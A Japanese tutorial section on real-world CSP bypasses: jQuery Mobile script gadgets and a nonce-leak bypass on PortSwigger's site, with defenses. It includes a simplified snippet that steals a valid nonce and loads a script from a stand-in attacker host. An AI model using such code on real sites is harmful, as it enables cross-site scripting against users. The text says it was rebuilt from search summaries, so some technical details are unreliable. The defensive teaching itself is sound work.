## CSPバイパス実例（Truesec / PortSwigger nonce）

CSP（Content Security Policy／コンテンツセキュリティポリシー。ブラウザに「このオリジンのスクリプトだけ実行してよい」といった許可リストを伝えるHTTPレスポンスヘッダ）は、反射型・格納型XSSに対する強力な多層防御として広く導入されている。しかし「CSPを設定した＝XSS不可能」ではない。本節では、CSPの理論的な穴ではなく、**実運用で実際に破られた2つの具体的な実例**を通じて、なぜ堅牢に見えるCSPが陥落するのかを仕組みレベルで理解する。

キーワードは「**script gadget（スクリプトガジェット）**」と「**nonce漏洩**」である。どちらも、CSP自体のロジックにバグがあるわけではなく、「CSPが許可した正規のコードを、攻撃者が意図しない用途に流用する」という共通の構造を持つ。

### 4-L-1 script gadget型バイパス：jQuery Mobileの実例（Truesec）

#### script gadgetとは何か

まず用語を定義する。**script gadget**とは、「攻撃者が直接スクリプトを注入しなくても、ページ上に既に読み込まれている“正規の”JavaScriptコードを、DOM構造やHTML属性の細工だけで“悪用可能な形”に誘導し、結果的に任意コード実行に持ち込む部品」を指す。

CSPの`script-src`は「どのスクリプトを実行してよいか」を制御するが、あくまで**スクリプトの出所（origin／nonce／hash）**を見ているだけであり、「そのスクリプトが内部で何をするか」までは検査しない。攻撃者がHTMLインジェクション（`<script>`タグやインラインイベントハンドラを使わない、単なるDOM構造の注入。CSPの直接の対象にならない）しかできない状況でも、既にCSPで許可されているライブラリ（jQuery、jQuery Mobile、AngularJS、Vue.jsなど）が「特定のHTML属性や構造を見つけると自動的にコードを実行する」という機能を持っていれば、それを**踏み台（gadget）**として使い、CSPには一切違反せずにスクリプト実行まで到達できる。

この概念を体系的に整理し広めたのはSebastian Lekiesらの研究（Google, 2017年 Black Hat/AppSec EU発表）だが、Truesecのブログはこの考え方を、より実践的に**jQuery Mobileという実在のライブラリの脆弱な挙動**に当てはめて解説している点に価値がある。

#### 前提条件

この攻撃が成立するための前提は次の通りである。

- サイトのCSPが`script-src`にjQuery Mobile本体（あるいはそれをホストするCDN）を許可している。
- 攻撃者が使えるのは**HTMLインジェクション**（例えば`innerHTML`へのユーザー入力代入や、サニタイザ通過後のDOM構造操作）のみで、`<script>`タグの直接注入・インラインイベントハンドラ・`javascript:`スキームはCSPやサニタイザによって阻止されている。

#### 仕組み

jQuery Mobileは、ページ内に挿入されたDOM要素を**自動的に「拡張（enhance）」する**設計になっている。具体的には、`data-role`をはじめとする`data-*`属性を持つ要素をライブラリが定期的・イベント駆動的に走査し、その属性値に応じて対応するウィジェットのロジック（ポップアップ表示、ページ遷移、コラプシブルパネルの開閉など）を**自動実行**する。この「属性を見て自動的に処理を行う」仕組み自体はCSP登場以前から存在する便利機能だが、CSP時代においては次のような危険な構造になる。

- 攻撃者は`<script>`を注入できなくても、`data-role="popup"`や`data-transition`といった**属性つきのDOM要素をHTMLインジェクションで挿入**できれば十分。
- jQuery Mobile側のウィジェット処理コードが、その属性値やリンク先（`href="#id"`によるDOM内フラグメント参照）を**信頼できる設定値として無検証で処理**してしまう経路がある場合、属性値の内容によっては最終的にDOM操作や既存コードパスの誤用を通じて、攻撃者が意図した副作用（別要素の内容やイベントハンドラの実行につながる状態）を引き起こせる。
- 重要なのは、**このとき実行されているスクリプトはすべて「CSPで許可済みのjQuery Mobile本体」自身**であり、CSPのポリシー評価上は一切違反していないという点である。CSPは「誰が書いたコードか」でしか許可を判定できず、「そのコードが今まさに攻撃者に悪用されているか」は判定できない。これがscript gadget型バイパスの本質的な原理である。

```html
<!-- 攻撃者がHTMLインジェクションで挿入できるのは <script> を含まない
     「一見無害な」data-*属性つきのマークアップのみ -->
<div data-role="popup" id="p1" data-transition="flip">
  ...attacker-controlled markup...
</div>
<a href="#p1" data-rel="popup">click</a>
```
> なぜ動くか: `<script>`もインラインハンドラも存在しないため、CSPの`script-src`・`unsafe-inline`禁止のいずれにも抵触しない。しかしCSPで許可済みのjQuery Mobile本体が、この属性つき構造をページロード後に自動走査・自動実行する設計になっているため、DOM構造の注入だけでライブラリの内部ロジックを起動できてしまう。

#### 影響とバージョン

Truesecの記事、および元となったLekiesらの研究では、**jQuery Mobile 1.4.5**（同ライブラリの事実上最後の安定版。2014年10月リリース）が、CSP・XSSフィルタ・DOMPurifyなど複数のミティゲーションを同時にすり抜けられる代表的な脆弱ライブラリとして繰り返し引用されている。jQuery Mobileは2021年に事実上の開発終了（メンテナンス終了）となっており、今後修正パッチが提供される見込みはない。したがって**「許可リストに古いUIライブラリが乗っている」こと自体がCSPの実効性を無効化しうる**、という教訓が重要になる。

#### 防御

- CSPの`script-src`に**バージョンを固定した信頼できるスクリプトのみ**を列挙し、jQuery Mobileのような「DOM走査による自動実行」を行う汎用UIライブラリを許可リストに含める場合は、既知のgadgetがないか個別に検証する。
- サニタイザ（DOMPurify等）は`<script>`やイベントハンドラ属性の除去だけでなく、**サイトで使用中のライブラリが解釈する独自の`data-*`属性・構造**も踏まえて設計する。
- 最終的な防御としては、DOM sink（入力が最終的に実行・解釈される危険な代入先。例：`innerHTML`）へのユーザー入力到達そのものを断つのが最も確実であり、CSPはあくまで多層防御の一枚として扱う。

> 出典: Bypassing modern XSS mitigations with code-reuse attacks — https://www.truesec.com/hub/blog/bypassing-modern-xss-mitigations-with-code-reuse-attacks
（本記事の原典サイトはこの実行環境のプロキシでアクセスがブロックされたため、WebSearchで得られた要約と、関連する一次研究であるSebastian Lekies et al., "Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets"（Black Hat USA / AppSec EU, 2017）、および Google製の実証コード集 `google/security-research-pocs`（script-gadgets/bypasses.md）の情報を踏まえて構成した。）

---

### 4-L-2 nonceベースCSPが「自社サイトで」破られた実例（PortSwigger Research）

#### nonceベースCSPの位置づけ

`script-src`をホスト名の許可リスト（allowlist）で書く方式は、許可ドメイン上にJSONPエンドポイントやオープンリダイレクトなど**「間借りできるスクリプト」**が1つでもあればバイパスされやすいことが知られている。そこで近年推奨されているのが**nonce（ノンス。リクエストごとにサーバーが生成するランダムな一回限りのトークン）ベースのCSP**である。

```
Content-Security-Policy: script-src 'nonce-r4nd0m123' 'strict-dynamic';
```

`<script nonce="r4nd0m123">...</script>`のように、レスポンス発行時に埋め込まれた正しいnonce値を持つ`<script>`だけが実行を許される。攻撃者はHTMLインジェクションができても、**レスポンスごとに変わる正しいnonce値を知らない限り**自分のスクリプトタグに正しいnonceを付けられないため、原理的にXSSを実行に持ち込めない――というのが設計上の期待である。

PortSwiggerの研究チームは、この「nonceベースCSPはallowlist型より安全」という通説を検証する過程で、**自社サイトportswigger.net自身**が実際にnonceベースCSPをバイパスされていたことを発見した。これは2023年12月9日にセキュリティ研究者Johan Carlsson（joaxcar）からHackerOne経由で報告された脆弱性（HackerOne報告 #2279346）で、2024年2月に詳細なwriteupが公開されている。

#### `strict-dynamic`が生む伝播的信頼という仕組み

上記のポリシー例にある`'strict-dynamic'`キーワードが本質的に重要である。これは「**正しいnonceを持つ`<script>`が、実行中に動的に生成・挿入した別の`<script>`要素は、たとえその新しい要素にnonceが付いていなくても信頼して実行してよい**」という、CSP仕様上の“信頼の伝播”ルールである（ホスト許可リストを無効化し、その代わりにこの伝播ルールを使う設計）。

これは実務上非常に重要な意味を持つ。**一度でも正規のnonceを持つスクリプトの実行コンテキストを乗っ取れれば（あるいは、有効なnonce値そのものを盗み出せれば）、その後は好きなだけスクリプトタグを動的に生成してDOMに追加でき、`strict-dynamic`のもとではnonceチェックなしに実行される**。つまりnonceベースCSPの安全性は、実質的に「有効なnonce値が外部から一切読み取れないこと」に懸念点が一極集中する。

#### nonce漏洩の経路：DOMプロパティとしてのnonce

ブラウザの仕様では、HTMLソース上の`nonce`属性値は、ページ描画後にセキュリティ上の配慮から**HTML属性としては`getAttribute("nonce")`で読めなくなる（空文字を返す）**ようマスクされる（いわゆるnonce hiding）。しかし同じ値は**DOMのJavaScriptプロパティ`element.nonce`としては引き続き読み取り可能**という非対称な設計になっている。

```js
document.querySelector('script').nonce // 正しいnonce値が取得できてしまう
document.querySelector('script').getAttribute('nonce') // "" (マスクされる)
```
> なぜ動くか: nonce hidingはあくまで「攻撃者がHTMLソースやDOMのシリアライズ結果（`outerHTML`など）を盗み見て値を持ち出す」経路を塞ぐための対策であり、ページ上で**既に実行できているJavaScriptコード**が`.nonce`プロパティに直接アクセスすることまでは防げない。攻撃者がすでに何らかの形でJavaScript実行の糸口（script gadget等）を得ていれば、この一行だけで有効なnonceを取得できる。

PortSwiggerの実例では、この「`.nonce`プロパティ経由でのnonce取得」を、**AngularJSのエラーハンドリング機構を悪用するscript gadget**（4-L-1で解説したものと同種の手法）と組み合わせていた。要点は次の通りである。

1. 攻撃者はサイト内の何らかの箇所にHTMLインジェクション（`<script>`タグを直接使わない、AngularJSに解釈される属性つきマークアップの注入）を成立させる。
2. その注入されたマークアップがAngularJSのエラーハンドラ経由のgadgetとして機能し、ページ内で**任意のJavaScript式**を評価できる状態になる。
3. その評価式の中で`document.querySelector('[nonce]').nonce`のようなセレクタを使い、ページ上に存在する正規スクリプトタグの有効なnonce値を取得する。
4. 取得したnonce値を使って、攻撃者が新しい`<script src="https://attacker.example/payload.js" nonce="盗んだ値">`要素を動的に生成しDOMに追加する。
5. `strict-dynamic`が有効なため、この新しい要素はホスト許可リストのチェックを受けず、**正しいnonceさえ持っていれば無条件で実行される**。

```js
// 概念を単純化した攻撃コード（実際のgadgetの起動方法はAngularJSの
// エラーハンドラ機構に依存するため詳細はwriteup原文を参照）
const stolenNonce = document.querySelector('[nonce]').nonce;
const s = document.createElement('script');
s.src = 'https://attacker.example/payload.js';
s.nonce = stolenNonce;
document.head.appendChild(s);
```
> なぜ動くか: ブラウザはCSPの`script-src`評価時に、新規挿入された`<script>`要素の`nonce`プロパティを見て、レスポンスヘッダで宣言された値と一致すれば実行を許可する。`strict-dynamic`下ではさらにホスト由来のチェックが免除されるため、正しいnonce値さえ再現できれば任意の外部ペイロードを読み込めてしまう。

#### 「動的解析」が果たした役割

PortSwigger Researchの記事タイトルが強調する“dynamic analysis（動的解析）”とは、静的なコードレビューやCSPヘッダの文面確認ではなく、**実際にブラウザでページをレンダリングし、DOM上で発生するイベントや関数呼び出しの結果を実行時に観測する検査手法**を指す。今回のケースでは、`document.querySelector`が条件に一致する要素が複数存在するとき常に**「文書順で最初の1要素」だけを返す**という、ごく基本的でありふれたDOM APIの仕様が、思わぬ形で「攻撃者から見て予測可能な正規nonce値の取得口」になっているという、静的な設定確認だけでは気づきにくい類の欠陥を、実行時の挙動観測によって機械的に発見できた点がこの研究の主眼である。

#### 防御策

- `strict-dynamic`は非常に強力な代わりに、**nonceの機密性が100%失われた瞬間に防御全体が崩壊する**運用リスクを背負うことを理解した上で採用する。
- ページ内のどこであれ、**攻撃者が制御できるコンテキストからJavaScriptを1行でも実行できる状態（script gadgetを含む）を残さない**。nonceベースCSPは「XSSを実行させない」対策ではなく「XSSされても被害を限定する」多層防御の一部であり、他のXSS対策（サニタイズ、Trusted Types等）を代替しない。
- 使用中のフロントエンドフレームワーク（AngularJS、Vue.js等）が持つエラーハンドラや属性解釈系のscript gadgetの有無を、既知の一覧（例：Google `security-research-pocs`のbypasses.md）と照合して点検する。
- 自動化された動的スキャン（実ブラウザでのレンダリングとDOM挙動観測）を、CSPヘッダの静的検証に加えて定期的に実施する。

> 出典: Hunting nonce-based CSP bypasses with dynamic analysis — https://portswigger.net/research/hunting-nonce-based-csp-bypasses-with-dynamic-analysis
（本記事の原典サイトはこの実行環境のプロキシでアクセスがブロックされたため、WebSearchで得られた要約に加え、同一の脆弱性について報告者本人が公開した詳細writeup「CSP bypass on PortSwigger.net using Google script resources」（Johan Carlsson／joaxcar.com, 2024年2月19日）、および対応するHackerOne公開報告 #2279346（2023年12月9日報告）の情報を踏まえて構成した。）

### まとめ：2つの実例に共通する原理

Truesecの事例とPortSwiggerの事例は、表面的には「script gadget」と「nonce漏洩」という別々の技術に見えるが、**CSPが“コードの出所”しか検証できず“実行内容の妥当性”は検証しないという同一の限界**に根ざしている点で本質的に同じ構造を持つ。CSPを設計・運用する際は、「許可リストに載っているコードは安全」と考えるのではなく、「許可リストに載っているコードが攻撃者にとっての踏み台（gadget）になりうるか」「信頼の伝播（`strict-dynamic`やnonceの露出経路）がどこまで及ぶか」を常に併せて検証する必要がある。
